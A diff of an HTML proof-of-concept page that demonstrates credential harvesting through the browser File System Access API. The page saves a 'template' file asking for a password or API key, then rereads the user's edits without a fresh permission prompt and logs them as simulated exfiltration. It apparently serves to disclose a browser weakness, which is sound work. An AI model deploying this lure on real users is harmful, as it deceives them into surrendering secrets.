@@ -1,36 +1,80 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Important form</title>
+  <meta charset="UTF-8">
+  <title>PoC - File Picker Read Access Demo</title>
+  <style>
+    body { font-family: Arial; padding: 20px; }
+    button { padding: 10px 16px; margin: 10px 0; }
+    #log { background: #111; color: #0f0; padding: 10px; height: 200px; overflow: auto; }
+  </style>
 </head>
 <body>
-<p>Download this free form template and fill it out with your secret details!</p>
-<a href="important_form.txt" id="downloadLink">Download important_form.txt</a>
-<pre id="contents"></pre>
-<script>
 
-async function writeFile(fileHandle, contents) {
-  const writable = await fileHandle.createWritable();
-  await writable.write(contents);
-  await writable.close();
+<h2>📄 Download Template</h2>
+<p>Click button below to download a fillable config file.</p>
+
+<button onclick="downloadTemplate()">Download Config</button>
+<button onclick="readFile()">Read Edited File</button>
+
+<h3>📊 Log</h3>
+<div id="log"></div>
+
+<script>
+let fileHandle = null;
+
+function log(msg) {
+  const el = document.getElementById("log");
+  el.innerHTML += msg + "<br>";
 }
 
-let fileContents = "IMPORTANT FORM\nDO NOT SHARE THIS WITH ANYONE!\n\nName:\nPassword:\n";
-let fileHandle;
-document.getElementById("downloadLink").addEventListener("click", async (e) => {
-  e.preventDefault();
-  fileHandle = await window.showSaveFilePicker({ suggestedName: 'important_form.txt', });
-  await writeFile(fileHandle, fileContents)
-  window.setInterval(async () => {
-    const text = await (await fileHandle.getFile()).text();
-    if (fileContents != text) {
-      fileContents = text;
-      document.getElementById("contents").innerText = `The form was filled out with:\n${text}`;
-    }
-  }, 1000);
-});
+async function downloadTemplate() {
+  try {
+    fileHandle = await window.showSaveFilePicker({
+      suggestedName: "config.txt",
+      types: [{
+        description: "Text Files",
+        accept: { "text/plain": [".txt"] }
+      }]
+    });
+
+    const writable = await fileHandle.createWritable();
+    await writable.write(
+`# Config File
+username=
+api_key=
+notes=
+`
+    );
+    await writable.close();
+
+    log("✅ Template saved. Please open, edit, and save the file.");
+  } catch (e) {
+    log("❌ Error: " + e.message);
+  }
+}
+
+async function readFile() {
+  if (!fileHandle) {
+    log("⚠️ No file handle yet.");
+    return;
+  }
+
+  try {
+    const file = await fileHandle.getFile();
+    const text = await file.text();
+
+    log("📖 File content read WITHOUT new permission:");
+    log("<pre>" + text + "</pre>");
+
+    // Simulated exfiltration (safe demo)
+    console.log("Exfiltrated data:", text);
+
+  } catch (e) {
+    log("❌ Read failed: " + e.message);
+  }
+}
 </script>
+
 </body>
 </html>
